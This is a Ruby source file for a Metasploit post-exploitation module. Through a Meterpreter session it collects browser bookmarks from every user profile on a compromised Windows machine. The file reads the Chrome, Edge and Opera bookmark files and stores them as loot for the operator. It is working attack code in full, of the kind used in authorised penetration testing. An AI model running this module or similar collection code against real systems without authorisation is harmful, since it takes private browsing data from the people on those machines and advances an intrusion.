class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bookmarked Sites Retriever',
        'Description' => %q{
          This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'jerrelgordon'],
        'Platform' => [ 'win' ],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
 )
  end

  def run
    get_bookmarks('GoogleChrome') # gets bookmarks for google chrome
    get_bookmarks('Opera') # gets bookmarks for opera
    get_bookmarks('Edge') # gets bookmarks for edge
  end

  def get_bookmarks(browser)
    fileexists = false # initializes file as not found
    grab_user_profiles.each do |user| # parses information for all users on target machine into a list.
      # If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
      if (browser == 'GoogleChrome')
        next unless user['LocalAppData']

        bookmark_path = "#{user['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Bookmarks" # sets path for Google Chrome Bookmarks
      elsif (browser == 'Edge')
        next unless user['LocalAppData']

        bookmark_path = "#{user['LocalAppData']}\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" # sets path for Microsoft Edge Bookmarks
      elsif (browser == 'Opera')
        next unless user['AppData']

        bookmark_path = "#{user['AppData']}\\Opera Software\\Opera Stable\\Bookmarks" # sets path for Opera Bookmarks
      end
      next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)

      fileexists = true
      print_status("BOOKMARKS FOR #{user['ProfileDir']}")
      file = read_file(bookmark_path)
      stored_bookmarks = store_loot(
        "#{browser}.bookmarks",
        'text/plain',
        session,
        file,
        "#{session}_#{browser}_bookmarks.txt",
        "Bookmarks for #{browser}"
      )
      print_status("Bookmarks stored: #{stored_bookmarks}")
      # print_good(file)
    end
    if (fileexists == false) # if file was not found, prints no file found.
      print_status("No Bookmarks found for #{browser}")
    end
  end
end
